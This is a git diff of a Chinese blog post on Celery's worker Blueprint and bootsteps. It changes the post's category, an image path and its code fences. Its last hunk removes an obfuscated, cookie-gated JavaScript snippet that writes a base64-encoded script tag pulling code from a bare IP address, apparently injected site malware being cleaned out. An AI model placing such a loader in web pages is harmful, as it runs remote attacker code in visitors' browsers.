@@ -3,7 +3,7 @@ title: Celery源码分析（三）---------Blueprint
 tags: []
 id: '68'
 categories:
-  - - sources_study
+  - - 分布式系统
     - Celery
 date: 2019-05-12 10:39:35
 ---
@@ -12,12 +12,13 @@ date: 2019-05-12 10:39:35
 
 首先，还是先看下时序流程图：
 
-![](http://www.anger6.com/wp-content/uploads/2019/05/c3-1024x876.jpg)
+![](/images/wp-content/uploads/2019/05/c3-1024x876.jpg)
 
 结合时序图进行分析:
 
 1.在Worker调用setup_instance时会构造Blueprint，这个Blueprint是个内部类，里面定义了其default_steps.
 
+```python
 class Blueprint(bootsteps.Blueprint):  
 """Worker bootstep blueprint."""  
 name = 'Worker'  
@@ -32,8 +33,6 @@ default_steps = set([
 'celery.worker.autoscale:WorkerComponent',  
 'celery.worker.autoreload:WorkerComponent',
 
-```
-])
 ```
 
 在Blueprint的构造函数里，主要代码就是构造自己的steps,如果构造函数传递了steps参数就用参数，否则就用default_steps.  
@@ -57,5 +56,3 @@ step如果自己实现了start方法则调用自己的实现，否则默认实�
 来源：CSDN  
 原文：https://blog.csdn.net/happyAnger6/article/details/53890071  
 版权声明：本文为博主原创文章，转载请附上博文链接！
-
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
